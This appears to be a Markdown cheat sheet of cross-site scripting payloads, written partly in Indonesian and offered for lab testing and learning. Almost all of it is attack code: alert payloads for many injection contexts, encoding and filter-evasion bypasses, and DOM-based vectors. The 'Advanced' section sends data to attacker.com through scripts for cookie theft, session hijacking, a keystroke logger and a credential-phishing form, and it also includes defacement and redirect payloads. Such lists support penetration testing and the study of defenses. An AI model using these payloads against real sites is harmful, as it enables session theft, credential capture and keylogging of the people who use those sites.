# XSS Hands-On Lab Payloads

Kumpulan payload XSS untuk testing dan pembelajaran.

## Basic XSS Payloads

### 1. Script Tag
```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

### 2. Image Tag
```html
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.domain)>
<img src="invalid" onerror="alert('XSS')">
```

### 3. SVG Tags
```html
<svg onload=alert('XSS')>
<svg onload=alert(document.domain)>
<svg><script>alert('XSS')</script></svg>
```

### 4. Input Tags
```html
<input autofocus onfocus=alert('XSS')>
<input onmouseover=alert('XSS')>
```

### 5. Body/HTML Tags
```html
<body onload=alert('XSS')>
<html onmouseover=alert('XSS')>
```

## Context-Specific Payloads

### HTML Attribute Context
```html
" onmouseover="alert('XSS')
' onfocus='alert('XSS')
" autofocus onfocus="alert('XSS')
```

### JavaScript Context
```javascript
'; alert('XSS'); //
"; alert('XSS'); //
'-alert('XSS')-'
</script><script>alert('XSS')</script>
```

### CSS Context
```css
red; } body { background: url('javascript:alert("XSS")')
expression(alert('XSS'))
</style><script>alert('XSS')</script>
```

### URL Context
```
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

## Advanced XSS Payloads

### Cookie Stealing
```html
<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie</script>
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

### Session Hijacking
```html
<script>fetch('http://attacker.com/steal.php', {method: 'POST', body: document.cookie})</script>
```

### Keylogger
```html
<script>
document.addEventListener('keypress', function(e) {
    new Image().src='http://attacker.com/log.php?key='+e.key;
});
</script>
```

### Phishing
```html
<script>
document.body.innerHTML = '<h1>Login Required</h1><form action="http://attacker.com/phish.php" method="post"><input name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>';
</script>
```

### Defacement
```html
<script>
document.body.innerHTML = '<h1 style="color:red;">HACKED BY XSS</h1>';
</script>
```

### Redirect
```html
<script>window.location.href='http://malicious-site.com'</script>
<meta http-equiv="refresh" content="0;url=http://malicious-site.com">
```

## Bypass Techniques

### Encoding
```html
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert('\x58\x53\x53')</script>
<script>alert('\u0058\u0053\u0053')</script>
```

### Case Variations
```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<svg OnLoAd=alert('XSS')>
```

### Alternative Tags
```html
<iframe src="javascript:alert('XSS')"></iframe>
<object data="javascript:alert('XSS')"></object>
<embed src="data:text/html,<script>alert('XSS')</script>">
```

### Event Handlers
```html
<div onmouseover=alert('XSS')>Hover me</div>
<button onclick=alert('XSS')>Click me</button>
<form><button formaction="javascript:alert('XSS')">Submit</button></form>
```

### Without Parentheses
```html
<script>alert`XSS`</script>
<script>setTimeout`alert\`XSS\``</script>
```

## DOM-based XSS Payloads

### Fragment-based
```
page.html#<script>alert('XSS')</script>
page.html#<img src=x onerror=alert('XSS')>
```

### Parameter-based
```
page.html?name=<script>alert('XSS')</script>
page.html?search=<svg onload=alert('XSS')>
```

## Filter Evasion

### Comment Insertion
```html
<scr<!--comment-->ipt>alert('XSS')</script>
<img src=x on<!--comment-->error=alert('XSS')>
```

### Null Byte
```html
<script%00>alert('XSS')</script>
<img src=x onerror%00=alert('XSS')>
```

### Alternative Quotes
```html
<script>alert("XSS")</script>
<script>alert('XSS')</script>
<script>alert(`XSS`)</script>
```

## Testing Checklist

### Input Fields
- [ ] Search boxes
- [ ] Comment forms
- [ ] User profiles
- [ ] Contact forms
- [ ] Registration forms

### URL Parameters
- [ ] GET parameters
- [ ] POST data
- [ ] URL fragments
- [ ] Path parameters

### Headers
- [ ] User-Agent
- [ ] Referer
- [ ] Cookie values
- [ ] Custom headers

### File Uploads
- [ ] Filename
- [ ] File content
- [ ] MIME type

## Defense Testing

Coba payload di atas pada aplikasi secure untuk melihat bagaimana defense mechanisms bekerja:

1. Input validation
2. Output encoding
3. Content Security Policy
4. X-XSS-Protection header
5. HTML sanitization

## Tools untuk Testing

- Browser Developer Tools
- Burp Suite
- OWASP ZAP
- XSSHunter
- BeEF Framework